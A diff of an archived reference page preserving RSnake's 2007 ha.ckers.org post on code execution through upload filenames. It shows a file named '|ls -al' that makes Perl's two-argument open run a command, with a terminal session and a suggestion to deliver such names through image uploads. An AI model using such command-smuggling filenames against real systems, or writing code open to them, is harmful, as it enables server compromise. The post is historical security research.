@@ -1,14 +1,13 @@
 ---
 type: Article
 title: ha.ckers.org web application security lab - Archive » Code Execution Through Filenames in Uploads
-description: "Uploading a file whose NAME is a shell command turns a sloppy reader into code execution. RSnake creates a file called \"|ls -al\"; Perl's two-argument open treats the leading pipe as a command, so the script runs the filename instead of reading it. He pairs it with his arbitrary image-name generator to reach the upload path."
 resource: "http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/"
-tags: [article, webseclist-reference, ha-ckers-org, file-upload, command-injection, perl, rce, filter-bypass, owasp-a03-2021, owasp-a05-2021]
+tags: [article, webseclist-reference, ha-ckers-org]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T10:08:42+00:00"
+  at: "2026-08-16T23:12:49+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/"
@@ -21,7 +20,7 @@ canonical_url: ""
 cited_by:
   - "2007.md:58"
 commit: ""
-content_sha256: b76d838b27dc8229383d665afc10aec8560e5cae865d23ebf954ba4509c03ef3
+content_sha256: cf92b436401a34a3ad233ae79badec0321793f187b36aa73d521351168d2db1f
 depth: full
 depth_reason: default
 kind: article
@@ -34,7 +33,7 @@ publisher_english: ""
 raw_sha256: d14a850772ef3eba379998ad17a425af1b3b14870d0a352897f322c36f547820
 retrieved_from: "http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T10:08:42+00:00"
+retrieved_utc: "2026-08-16T23:12:49+00:00"
 slug: ha-ckers-org-ha-ckers-org-web-application-security-lab-archive-code-uploads
 snapshot: 20080112152853
 title_english: ""
@@ -48,7 +47,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/>
-- Preserved from: http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/ (stored) on 2026-08-09
+- Preserved from: http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/ (stored) on 2026-08-16
 - Capture timestamp: 20080112152853
 - Licence: unknown
 
@@ -86,20 +85,30 @@ opendir(DIR, ".") || die "Can't open dir: $!\n";
 Now here is me showing what is inside the file I named “|ls -al”, then showing what is inside the directory, and lastly, running the code:
 
 > [haX0r]$ cat \|ls\ -al
- This information is within the file |ls -al
- [haX0r]$ ls -al
- total 08
- drwxr-xr-x 2 haX0r haX0r 512 Jun 19 15:43 .
- drwxr-xr-x 37 haX0r haX0r 4096 Jun 18 12:59 ..
- -rw-r–r– 1 haX0r haX0r 247 Jun 19 15:46 test.pl
- -rw-r–r– 1 haX0r haX0r 0 Jun 19 15:43 |ls -al
- [haX0r]$ perl test.pl
- [haX0r]$ total 14
- drwxr-xr-x 2 haX0r haX0r 512 Jun 19 15:43 .
- drwxr-xr-x 37 haX0r haX0r 4096 Jun 18 12:59 ..
- -rw-r–r– 1 haX0r haX0r 247 Jun 19 15:46 test.pl
- -rw-r–r– 1 haX0r haX0r 0 Jun 19 15:43 |ls -al
+>  This information is within the file |ls -al
+>  [haX0r]$ ls -al
+>  total 08
+>  drwxr-xr-x 2 haX0r haX0r 512 Jun 19 15:43 .
+>  drwxr-xr-x 37 haX0r haX0r 4096 Jun 18 12:59 ..
+>  -rw-r–r– 1 haX0r haX0r 247 Jun 19 15:46 test.pl
+>  -rw-r–r– 1 haX0r haX0r 0 Jun 19 15:43 |ls -al
+>  [haX0r]$ perl test.pl
+>  [haX0r]$ total 14
+>  drwxr-xr-x 2 haX0r haX0r 512 Jun 19 15:43 .
+>  drwxr-xr-x 37 haX0r haX0r 4096 Jun 18 12:59 ..
+>  -rw-r–r– 1 haX0r haX0r 247 Jun 19 15:46 test.pl
+>  -rw-r–r– 1 haX0r haX0r 0 Jun 19 15:43 |ls -al
 
 Immediately after running the program **it ran the filename instead of opening the file**. So herein lies another interesting place to use that [arbitrary image name creation program](http://ha.ckers.org/blog/20070603/image-upload-xss/) I built (I guess it’s not just for XSS afterall - but actual code execution on the host machine). [Here would be an example](http://ha.ckers.org/image-xss/|ls). Encoding spaces might cause problems but I’m sure we can work around that in most cases. Pretty trivial and pretty nasty.
 
   This entry was posted on Wednesday, June 20th, 2007 at 1:21 pm and is filed under [Webappsec](http://ha.ckers.org/blog/category/webappsec/). You can follow any responses to this entry through the [RSS 2.0](http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/feed/) feed. You can leave a response, or [trackback](http://ha.ckers.org/blog/20070620/code-execution-through-filenames-in-uploads/trackback/) from your own site.
+
+### Leave a Reply Or Discuss [On the Forums](http://sla.ckers.org/forum/)
+
+ Name (required)
+
+ Mail (will not be published) (required)
+
+ Website
+
+---
